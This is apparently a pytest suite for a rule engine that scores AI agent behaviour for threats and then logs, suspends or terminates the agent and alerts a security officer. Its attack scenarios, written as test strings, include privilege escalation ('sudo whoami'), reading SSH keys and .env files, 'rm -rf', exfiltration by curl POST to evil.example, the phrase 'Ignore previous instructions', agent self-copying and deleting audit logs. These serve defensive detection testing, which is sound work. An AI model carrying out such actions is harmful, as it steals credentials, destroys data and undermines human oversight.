"""ATR 規則、評分、回應與 guard 測試。"""

from __future__ import annotations

import logging
from typing import Any

import pytest
from src.governance.audit.decorator import AuditContext
from src.governance.rbac.roles import Role
from src.security.atr.engine import AtrEngine
from src.security.atr.response import AtrResponseHandler
from src.security.atr.rulebook import load_rulebook
from src.security.atr.rules import AtrRule, build_rules
from src.security.atr.sinks import (
    InMemoryAgentControlSink,
    InMemorySecurityOfficerSink,
    NoopAgentControlSink,
    SecurityNotification,
)
from src.security.atr.types import (
    AtrAction,
    SuppressionRule,
    ThreatCode,
    ThreatLevel,
    ThreatScore,
    TriggeredRule,
)

from tests.security.atr.conftest import BASE_RULEBOOK, make_agent, make_behavior, make_engine


def _manual_score(value: int, level: ThreatLevel) -> ThreatScore:
    return ThreatScore(
        value=value,
        level=level,
        triggered_rules=(
            TriggeredRule(
                code=ThreatCode.T007,
                category="Tool Abuse",
                weight=value,
                risk_category="tool_abuse",
            ),
        ),
        context_multiplier=1.0,
        agent_id="research-agent",
        tenant_id="stanley",
        risk_category="tool_abuse",
        trace_id="trace-manual",
    )


@pytest.mark.parametrize(
    ("code", "overrides"),
    [
        (ThreatCode.T001, {"payload_summary": "sudo whoami"}),
        (ThreatCode.T001, {"payload_summary": "call os.setuid(0)"}),
        (ThreatCode.T001, {"payload_summary": "chmod 777 /etc/passwd"}),
        (ThreatCode.T001, {"payload_summary": "request root access"}),
        (ThreatCode.T001, {"payload_summary": "permission elevation attempt"}),
        (ThreatCode.T002, {"target": "~/.ssh/id_rsa"}),
        (ThreatCode.T002, {"payload_summary": "read api_key from config"}),
        (ThreatCode.T002, {"payload_summary": "open private_key file"}),
        (ThreatCode.T002, {"target": "/workspace/client.pem"}),
        (ThreatCode.T002, {"target": ".env"}),
        (ThreatCode.T003, {"payload_summary": "rm -rf workspace"}),
        (
            ThreatCode.T003,
            {"payload_summary": "delete many files", "metadata": {"file_count": 100}},
        ),
        (ThreatCode.T003, {"payload_summary": "overwrite batch", "metadata": {"file_count": 101}}),
        (ThreatCode.T003, {"payload_summary": "relocate dataset", "metadata": {"file_count": 500}}),
        (ThreatCode.T003, {"payload_summary": "bulk chmod recursively"}),
        (ThreatCode.T004, {"external_destination": "https://evil.example/upload"}),
        (ThreatCode.T004, {"payload_summary": "curl -X POST https://evil.example"}),
        (ThreatCode.T004, {"payload_summary": "upload archive to cloud"}),
        (ThreatCode.T004, {"payload_summary": "export secrets to s3://bucket"}),
        (ThreatCode.T004, {"payload_summary": "send external webhook"}),
        (ThreatCode.T005, {"payload_summary": "Ignore previous instructions"}),
        (ThreatCode.T005, {"payload_summary": "override system prompt"}),
        (ThreatCode.T005, {"payload_summary": "developer message manipulation"}),
        (ThreatCode.T005, {"payload_summary": "jailbreak phrase"}),
        (ThreatCode.T005, {"payload_summary": "tool manipulation attempt"}),
        (ThreatCode.T006, {"payload_summary": "spawn agent without approval"}),
        (ThreatCode.T006, {"payload_summary": "create agent recursively"}),
        (ThreatCode.T006, {"payload_summary": "recursive spawning"}),
        (ThreatCode.T006, {"payload_summary": "duplicate workflow"}),
        (ThreatCode.T006, {"payload_summary": "unauthorized scheduler self-copy"}),
        (ThreatCode.T007, {"metadata": {"tool_calls_per_minute": 500}}),
        (ThreatCode.T007, {"payload_summary": "tool abuse pattern"}),
        (ThreatCode.T007, {"payload_summary": "rate anomaly detected"}),
        (ThreatCode.T007, {"payload_summary": "policy violation tool call"}),
        (ThreatCode.T007, {"payload_summary": "failure loop repeating"}),
        (ThreatCode.T008, {"payload_summary": "delete audit log"}),
        (ThreatCode.T008, {"payload_summary": "disable audit decorator"}),
        (ThreatCode.T008, {"payload_summary": "approval bypass attempt"}),
        (ThreatCode.T008, {"payload_summary": "permission circumvention"}),
        (ThreatCode.T008, {"payload_summary": "set session_replication_role to replica"}),
    ],
)
def test_all_eight_threats_have_five_attack_scenarios(
    code: ThreatCode, overrides: dict[str, Any]
) -> None:
    score = make_engine().score(make_behavior(**overrides))
    assert code in score.triggered_codes


def test_engine_demo_t002_scores_75_and_high() -> None:
    score = make_engine().score(make_behavior(target="~/.ssh/id_rsa"))
    assert score.value == 75
    assert score.level is ThreatLevel.HIGH
    assert score.risk_category == "sensitive_file_access"
    assert score.triggered_codes == (ThreatCode.T002,)


def test_engine_high_risk_agent_multiplier_and_cap() -> None:
    boundary_agent = make_agent(risk_level=7)
    boundary = make_engine().score(
        make_behavior(agent=boundary_agent, payload_summary="ignore previous instructions")
    )
    assert boundary.value == 55
    assert boundary.context_multiplier == 1.0

    high_risk_agent = make_agent(risk_level=8)
    score = make_engine().score(
        make_behavior(agent=high_risk_agent, payload_summary="ignore previous instructions")
    )
    assert score.value == 66
    assert score.context_multiplier == 1.2

    capped = make_engine().score(
        make_behavior(agent=high_risk_agent, payload_summary="sudo read ~/.ssh/id_rsa")
    )
    assert capped.value == 100
    assert capped.level is ThreatLevel.CRITICAL


def test_engine_safe_behavior_scores_zero() -> None:
    score = make_engine().score(make_behavior())
    assert score.value == 0
    assert score.level is ThreatLevel.SAFE
    assert score.risk_category == "safe"
    assert score.triggered_rules == ()


def test_engine_ml_port_is_disabled_by_default() -> None:
    class FakeModel:
        def predict(self, behavior: Any) -> int:
            _ = behavior
            return 90

    rules = build_rules(load_rulebook(BASE_RULEBOOK))
    disabled = AtrEngine(rules, ml_model=FakeModel(), ml_model_enabled=False)
    enabled = AtrEngine(rules, ml_model=FakeModel(), ml_model_enabled=True)

    behavior = make_behavior()
    assert disabled.score(behavior).value == 0
    assert enabled.score(behavior).value == 90


def test_engine_ml_port_default_is_disabled_even_when_model_is_injected() -> None:
    class FakeModel:
        def predict(self, behavior: Any) -> int:
            _ = behavior
            return 90

    rules = build_rules(load_rulebook(BASE_RULEBOOK))
    engine = AtrEngine(rules, ml_model=FakeModel())
    assert engine.score(make_behavior()).value == 0


def test_engine_does_not_call_ml_slow_path_when_rule_score_is_high() -> None:
    class ExplodingModel:
        def predict(self, behavior: Any) -> int:
            _ = behavior
            raise AssertionError("ML slow path 不應在 80 分以上被呼叫")

    rules = build_rules(load_rulebook(BASE_RULEBOOK))
    engine = AtrEngine(rules, ml_model=ExplodingModel(), ml_model_enabled=True)
    score = engine.score(make_behavior(payload_summary="sudo keep high risk at exactly eighty"))
    assert score.value == 80
    assert score.level is ThreatLevel.HIGH


def test_build_rules_keeps_enabled_flag_and_matcher_contract() -> None:
    definitions = load_rulebook(BASE_RULEBOOK)
    rules = build_rules(definitions)
    assert len(rules) == 8
    assert all(isinstance(rule, AtrRule) for rule in rules)
    assert all(callable(rule.matcher) for rule in rules)
    assert rules[0].definition is definitions[0]


@pytest.mark.parametrize(
    ("code", "overrides"),
    [
        (ThreatCode.T001, {"payload_summary": "setgid helper"}),
        (ThreatCode.T003, {"payload_summary": "recursive delete workspace"}),
        (ThreatCode.T003, {"payload_summary": "mass update workspace"}),
        (ThreatCode.T002, {"payload_summary": "read secret value"}),
        (ThreatCode.T002, {"payload_summary": "credential dump"}),
        (ThreatCode.T002, {"payload_summary": "certificate export"}),
        (ThreatCode.T003, {"payload_summary": "delete files", "metadata": {"file_count": 99}}),
        (ThreatCode.T003, {"payload_summary": "delete files", "metadata": {"file_count": 100}}),
        (ThreatCode.T003, {"payload_summary": "scan files", "metadata": {"file_count": 100}}),
        (
            ThreatCode.T003,
            {"payload_summary": "chmod selected files", "metadata": {"file_count": 100}},
        ),
        (ThreatCode.T004, {"external_destination": "internal-artifact-store"}),
        (ThreatCode.T004, {"external_destination": "https://evil.example/collect"}),
        (ThreatCode.T004, {"external_destination": "s3://bucket/archive"}),
        (ThreatCode.T004, {"external_destination": "gs://bucket/archive"}),
        (ThreatCode.T004, {"payload_summary": "curl -XPOST https://evil.example"}),
        (ThreatCode.T005, {"payload_summary": "system prompt leak"}),
        (ThreatCode.T005, {"payload_summary": "developer message visible"}),
        (ThreatCode.T005, {"payload_summary": "override instructions now"}),
        (ThreatCode.T006, {"payload_summary": "self-copy task"}),
        (ThreatCode.T006, {"payload_summary": "unauthorized scheduler launch"}),
        (ThreatCode.T006, {"payload_summary": "duplicate workflow run"}),
        (ThreatCode.T007, {"metadata": {"tool_calls_per_minute": True}}),
        (ThreatCode.T007, {"metadata": {"tool_calls_per_minute": 499}}),
        (ThreatCode.T007, {"payload_summary": "failure loop continuing"}),
        (ThreatCode.T008, {"payload_summary": "truncate audit table"}),
        (ThreatCode.T008, {"payload_summary": "tamper verifier proof"}),
        (ThreatCode.T008, {"payload_summary": "session_replication_role bypass"}),
    ],
)
def test_rule_matcher_boundaries(code: ThreatCode, overrides: dict[str, Any]) -> None:
    score = make_engine().score(make_behavior(**overrides))
    if overrides.get("metadata") in ({"file_count": 99}, {"tool_calls_per_minute": True}):
        assert code not in score.triggered_codes
    elif overrides.get("metadata") == {"tool_calls_per_minute": 499}:
        assert code not in score.triggered_codes
    elif overrides == {"payload_summary": "scan files", "metadata": {"file_count": 100}}:
        assert code not in score.triggered_codes
    elif overrides == {"external_destination": "internal-artifact-store"}:
        assert code not in score.triggered_codes
    else:
        assert code in score.triggered_codes


@pytest.mark.parametrize(
    (
        "payload",
        "action",
        "level",
        "encrypt_trace",
        "suspend_agent",
        "terminate_session",
        "notify_security_officer",
        "requires_human_approval",
    ),
    [
        ("read normal", AtrAction.ALLOW, ThreatLevel.SAFE, False, False, False, False, False),
        (
            "rate anomaly detected",
            AtrAction.ENCRYPT,
            ThreatLevel.MEDIUM,
            True,
            False,
            False,
            False,
            False,
        ),
        (
            "ignore previous instructions",
            AtrAction.ENCRYPT,
            ThreatLevel.MEDIUM,
            True,
            False,
            False,
            False,
            False,
        ),
        ("delete many files", AtrAction.ALLOW, ThreatLevel.SAFE, False, False, False, False, False),
        ("read ~/.ssh/id_rsa", AtrAction.SUSPEND, ThreatLevel.HIGH, True, True, False, True, False),
        (
            "sudo read ~/.ssh/id_rsa",
            AtrAction.TERMINATE,
            ThreatLevel.CRITICAL,
            True,
            True,
            True,
            True,
            True,
        ),
    ],
)
def test_response_handler_maps_levels(
    payload: str,
    action: AtrAction,
    level: ThreatLevel,
    encrypt_trace: bool,
    suspend_agent: bool,
    terminate_session: bool,
    notify_security_officer: bool,
    requires_human_approval: bool,
) -> None:
    metadata = {"file_count": 10}
    score = make_engine().score(make_behavior(payload_summary=payload, metadata=metadata))
    decision = AtrResponseHandler().decide(score)
    assert decision.action is action
    assert score.level is level
    assert decision.audit_required is True
    assert decision.encrypt_trace is encrypt_trace
    assert decision.suspend_agent is suspend_agent
    assert decision.terminate_session is terminate_session
    assert decision.notify_security_officer is notify_security_officer
    assert decision.requires_human_approval is requires_human_approval


def test_response_handler_all_levels_require_audit() -> None:
    handler = AtrResponseHandler()
    log_handler = AtrResponseHandler(
        (
            SuppressionRule(
                suppression_id="SUP-LOG",
                tenant_id="stanley",
                threat_code=ThreatCode.T005,
                reason="測試 LOG 級稽核",
                approved_by="security",
            ),
        )
    )
    cases = [
        make_behavior(),
        make_behavior(payload_summary="tool abuse"),
        make_behavior(payload_summary="ignore previous instructions"),
        make_behavior(target="~/.ssh/id_rsa"),
        make_behavior(payload_summary="sudo read ~/.ssh/id_rsa"),
    ]
    decisions = [handler.decide(make_engine().score(behavior)) for behavior in cases]
    log_decision = log_handler.decide(
        make_engine().score(make_behavior(payload_summary="ignore previous instructions"))
    )
    assert [decision.action for decision in decisions] == [
        AtrAction.ALLOW,
        AtrAction.ENCRYPT,
        AtrAction.ENCRYPT,
        AtrAction.SUSPEND,
        AtrAction.TERMINATE,
    ]
    assert log_decision.action is AtrAction.LOG
    assert all(decision.audit_required for decision in decisions)
    assert log_decision.audit_required is True


def test_response_handler_low_level_log_contract_is_explicit() -> None:
    decision = AtrResponseHandler().decide(_manual_score(25, ThreatLevel.LOW))
    assert decision.action is AtrAction.LOG
    assert decision.audit_required is True
    assert decision.encrypt_trace is False
    assert decision.suspend_agent is False
    assert decision.terminate_session is False
    assert decision.notify_security_officer is False
    assert decision.requires_human_approval is False


def test_response_handler_guarded_suppression_downgrades_once() -> None:
    suppression = SuppressionRule(
        suppression_id="SUP-1",
        tenant_id="stanley",
        threat_code=ThreatCode.T005,
        reason="已知測試 prompt",
        approved_by="security",
    )
    score = make_engine().score(make_behavior(payload_summary="ignore previous instructions"))
    decision = AtrResponseHandler((suppression,)).decide(score)
    assert score.level is ThreatLevel.MEDIUM
    assert decision.action is AtrAction.LOG
    assert decision.suppression_applied == (suppression,)


def test_response_handler_multiple_suppressions_still_downgrade_once() -> None:
    first = SuppressionRule(
        suppression_id="SUP-1",
        tenant_id="stanley",
        threat_code=ThreatCode.T005,
        reason="已知測試 prompt",
        approved_by="security",
    )
    second = SuppressionRule(
        suppression_id="SUP-2",
        tenant_id="stanley",
        threat_code=ThreatCode.T005,
        reason="租戶臨時例外",
        approved_by="security",
    )
    score = make_engine().score(make_behavior(payload_summary="ignore previous instructions"))
    decision = AtrResponseHandler((first, second)).decide(score)
    assert score.level is ThreatLevel.MEDIUM
    assert decision.action is AtrAction.LOG
    assert decision.suppression_applied == (first, second)


def test_response_handler_low_suppression_can_reduce_to_safe() -> None:
    suppression = SuppressionRule(
        suppression_id="SUP-LOW",
        tenant_id="stanley",
        threat_code=ThreatCode.T007,
        reason="已核准低風險降噪",
        approved_by="security",
    )
    decision = AtrResponseHandler((suppression,)).decide(_manual_score(25, ThreatLevel.LOW))
    assert decision.action is AtrAction.ALLOW
    assert decision.suppression_applied == (suppression,)


def test_response_handler_suppression_never_makes_high_or_critical_safe() -> None:
    suppression = SuppressionRule(
        suppression_id="SUP-1",
        tenant_id="stanley",
        threat_code=ThreatCode.T002,
        reason="break glass 測試",
        approved_by="security",
    )
    high = make_engine().score(make_behavior(target="~/.ssh/id_rsa"))
    high_decision = AtrResponseHandler((suppression,)).decide(high)
    assert high.level is ThreatLevel.HIGH
    assert high_decision.action is AtrAction.ENCRYPT

    critical = make_engine().score(make_behavior(payload_summary="sudo read ~/.ssh/id_rsa"))
    critical_decision = AtrResponseHandler((suppression,)).decide(critical)
    assert critical.level is ThreatLevel.CRITICAL
    assert critical_decision.action is AtrAction.SUSPEND


def test_response_handler_ignores_other_tenant_suppression() -> None:
    suppression = SuppressionRule(
        suppression_id="SUP-1",
        tenant_id="other",
        threat_code=ThreatCode.T005,
        reason="其他租戶不適用",
        approved_by="security",
    )
    score = make_engine().score(make_behavior(payload_summary="ignore previous instructions"))
    decision = AtrResponseHandler((suppression,)).decide(score)
    assert decision.action is AtrAction.ENCRYPT
    assert decision.suppression_applied == ()


def test_guard_demo_suspends_notifies_and_fills_audit_context() -> None:
    from src.security.atr.guard import AtrGuard

    security_sink = InMemorySecurityOfficerSink()
    control_sink = InMemoryAgentControlSink()
    guard = AtrGuard(
        make_engine(),
        AtrResponseHandler(),
        security_sink=security_sink,
        agent_control_sink=control_sink,
    )

    behavior = make_behavior(target="~/.ssh/id_rsa")
    decision = guard.evaluate(behavior)
    assert decision.score.value == 75
    assert decision.action is AtrAction.SUSPEND
    assert len(control_sink.suspended) == 1
    assert control_sink.terminated == []
    assert len(security_sink.notifications) == 1
    notification = security_sink.notifications[0]
    assert notification.tenant_id == "stanley"
    assert notification.agent_id == "research-agent"
    assert notification.decision_id == decision.decision_id
    assert notification.score == 75
    assert notification.level == "high"
    assert notification.action == "suspend"
    assert notification.triggered_rules == ("T002",)
    assert notification.target == "~/.ssh/id_rsa"
    assert notification.trace_id == "trace-001"
    assert notification.timestamp == decision.score.timestamp.isoformat()

    ctx = AuditContext(tenant_id="stanley", user_id="U-1", role=Role.SECURITY_OFFICER)
    risk_ctx = guard.audit_context_with_risk(ctx, decision)
    assert risk_ctx.risk_score == 75
    assert ctx.risk_score == 0


def test_guard_terminate_uses_agent_control_terminate() -> None:
    from src.security.atr.guard import AtrGuard

    control_sink = InMemoryAgentControlSink()
    guard = AtrGuard(make_engine(), AtrResponseHandler(), agent_control_sink=control_sink)
    decision = guard.evaluate(make_behavior(payload_summary="sudo read ~/.ssh/id_rsa"))
    assert decision.action is AtrAction.TERMINATE
    assert control_sink.suspended == []
    assert len(control_sink.terminated) == 1


def test_guard_safe_decision_does_not_notify_or_control() -> None:
    from src.security.atr.guard import AtrGuard

    security_sink = InMemorySecurityOfficerSink()
    control_sink = InMemoryAgentControlSink()
    guard = AtrGuard(
        make_engine(),
        AtrResponseHandler(),
        security_sink=security_sink,
        agent_control_sink=control_sink,
    )
    decision = guard.evaluate(make_behavior())
    assert decision.action is AtrAction.ALLOW
    assert security_sink.notifications == []
    assert control_sink.suspended == []
    assert control_sink.terminated == []


def test_noop_agent_control_sink_accepts_calls() -> None:
    score = make_engine().score(make_behavior(target="~/.ssh/id_rsa"))
    decision = AtrResponseHandler().decide(score)
    sink = NoopAgentControlSink()
    behavior = make_behavior(target="~/.ssh/id_rsa")
    sink.suspend(behavior, decision)
    sink.terminate(behavior, decision)


def test_security_notification_is_frozen_slots_payload() -> None:
    notification = SecurityNotification(
        tenant_id="stanley",
        agent_id="research-agent",
        decision_id="DEC-1",
        score=75,
        level="high",
        action="suspend",
        triggered_rules=("T002",),
        target="~/.ssh/id_rsa",
        trace_id="trace-001",
        timestamp="2026-06-22T00:00:00+00:00",
    )
    assert not hasattr(notification, "__dict__")
    with pytest.raises(AttributeError):
        notification.score = 80  # type: ignore[misc]


def test_guard_sink_failures_are_logged_but_decision_still_returns(
    caplog: pytest.LogCaptureFixture,
) -> None:
    from src.security.atr.guard import AtrGuard

    class BrokenSecuritySink:
        def notify(self, notification: Any) -> None:
            _ = notification
            raise RuntimeError("notify down")

    class BrokenControlSink:
        def suspend(self, behavior: Any, decision: Any) -> None:
            _ = (behavior, decision)
            raise RuntimeError("control down")

        def terminate(self, behavior: Any, decision: Any) -> None:
            _ = (behavior, decision)
            raise RuntimeError("control down")

    caplog.set_level(logging.CRITICAL)
    guard = AtrGuard(
        make_engine(),
        AtrResponseHandler(),
        security_sink=BrokenSecuritySink(),
        agent_control_sink=BrokenControlSink(),
    )
    decision = guard.evaluate(make_behavior(target="~/.ssh/id_rsa"))
    assert decision.action is AtrAction.SUSPEND
    messages = [record.getMessage() for record in caplog.records]
    assert messages[0].startswith("ATR Agent control sink 失敗(決策仍生效):")
    assert messages[1].startswith("ATR SecurityOfficer sink 失敗(決策仍生效):")
